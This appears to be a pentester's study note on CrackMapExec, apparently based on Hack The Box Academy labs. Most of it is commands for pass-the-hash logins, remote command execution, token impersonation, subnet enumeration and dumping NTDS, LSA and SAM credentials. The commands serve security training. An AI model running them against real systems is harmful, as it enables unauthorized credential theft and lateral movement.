Related articles: 
Tags: #Tools 

---

CrackMapExec is a post-foothold tool used for lateral movement and privilege escalation. It can be used to dump the LSA, SAM, PTH.

Using NTLM hash to authenticate and list shares
``` bash
crackmapexec smb 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 --shares
```

  Same hash to execute commands
``` bash
crackmapexec smb 192.168.1.100 -u Administrator -H aad3b435b51404eeaad3b435b51404ee:31d6cfe0d16ae931b73c59d7e0c089c0 -x whoami
``` 

Capturing the NTDS
```bash
crackmapexec smb 10.129.201.57 -u bwilliamson -p P@55w0rd! --ntds
```

Dumping LSA Secrets Remotely
```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --lsa
```

Dumping SAM Remotely:
```bash
crackmapexec smb 10.129.42.198 --local-auth -u bob -p HTB_@cademy_stdnt! --sam
```

 Using the tokens module 
```bash
crackmapexec smb 192.168.1.100 -u Administrator -p 'Password123' -M tokens
```

```bash
crackmapexec smb 192.168.1.100 -u Administrator -p 'Password123' --impersonate-user domain\targetuser
``` 

SMBEXEC:
```bash

crackmapexec smb 10.10.110.17 -u Administrator -p 'Password123!' -x 'whoami' --exec-method smbexec

```

#### Enumerating Logged-on Users

Imagine we are in a network with multiple machines. Some of them share the same local administrator account. In this case, we could use `CrackMapExec` to enumerate logged-on users on all machines within the same network `10.10.110.17/24`, which speeds up our enumeration process.

  Attacking SMB
```bash
crackmapexec smb 10.10.110.0/24 -u administrator -p 'Password123!' --loggedon-users
```
#### Pass-the-Hash (PtH)

If we manage to get an NTLM hash of a user, and if we cannot crack it, we can still use the hash to authenticate over SMB with a technique called Pass-the-Hash (PtH). PtH allows an attacker to authenticate to a remote server or service using the underlying NTLM hash of a user's password instead of the plaintext password. We can use a PtH attack with any `Impacket` tool, `SMBMap`, `CrackMapExec`, among other tools. Here is an example of how this would work with `CrackMapExec`:

  Attacking SMB

```bash
crackmapexec smb 10.10.110.17 -u Administrator -H 2B576ACBE6BCFDA7294D6BD18041B8FE
```

Use --continue-on-success to continue after finding a good combo cred.
